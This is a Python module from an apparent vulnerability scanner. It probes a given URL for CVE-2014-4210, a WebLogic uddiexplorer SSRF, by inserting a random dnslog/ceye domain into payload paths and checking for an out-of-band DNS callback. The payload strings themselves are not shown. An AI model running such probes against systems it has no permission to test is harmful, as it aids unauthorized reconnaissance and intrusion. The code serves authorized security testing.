#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from thirdparty import requests
from time import sleep

def cve_2014_4210_scan(self, url):
    ''' Weblogic uddiexplorer SSRF漏洞
            uddiexplorer组件的SearchPublicRegistries.jsp页面存在一个SSRF漏洞
    '''
    sessid = '0fe976335bbe903a97650f15dcb0ce47'
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'SSRF'
    vul_info['vul_id'] = 'CVE-2014-4210'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    headers = self.headers.copy()                               # * 复制一份headers, 防止污染全局headers
    headers.update(vul_info['headers'])                         # * 合并Headers

    for payload in self.cve_2014_4210_payloads:                 # * Payload
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path'].replace('dnsdomain', dns_domain) # * Path
        data = payload['data']                                  # * Data
        target = url + path                                     # * Target

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            sleep(3)                                                # * dns查询可能较慢, 等一会
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
